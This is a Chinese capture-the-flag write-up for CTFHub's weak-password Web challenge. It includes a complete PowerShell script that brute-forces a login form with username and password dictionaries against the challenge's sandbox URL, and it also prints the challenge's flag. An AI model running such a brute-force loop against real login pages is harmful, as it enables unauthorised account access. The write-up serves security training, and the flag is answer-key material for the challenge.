# 弱口令
**题目来源**: CTFHub
**题型**: Web
**难度**: 简单

## 解题思路
1. 进入题目登录页面，按下F12审查网页源码，抓包分析登录表单，确定提交参数为 name 和 password。
2. 准备用户名字典 user.txt、密码字典 pass.txt，编写 PowerShell 爆破脚本进行批量枚举测试。
3. 修改脚本里面的靶机地址，运行脚本持续爆破，成功匹配正确账号密码，拿到 Flag。

## 关键操作
> 通过前端源码分析表单参数，利用字典配合 PowerShell 脚本批量弱口令爆破，成功登录拿到 flag。

### PowerShell完整爆破脚本
```powershell
$usernames = Get-Content "$env:USERPROFILE\Desktop\user.txt"
$passwords = Get-Content "$env:USERPROFILE\Desktop\pass.txt"
$url = "http://challenge-c3f69fd2e86b8ed9.sandbox.ctfhub.com:10800/"

Write-Host "开始跑字典..." -ForegroundColor Cyan
foreach ($user in $usernames) {
    foreach ($pwd in $passwords) {
        $res = curl.exe -s -X POST -d "name=$user&password=$pwd" $url
        if ($res -match "ctfhub{") {
            Write-Host "`n[+] 成功！用户名: $user, 密码: $pwd" -ForegroundColor Green
            Write-Host "Flag: $res"
            return
        }
    }
}
Write-Host "`n字典跑完了，没找到。" -ForegroundColor Yellow

##Flag

`ctfhub{b6844bb7c694688d13d5511d｝`

##总结

本题考察 Web 常见的弱口令爆破漏洞，网站未做防爆破限制、账号密码过于简单，导致攻击者可以通过字典枚举遍历破解登录权限，是Web密码口令类题型的基础考点。
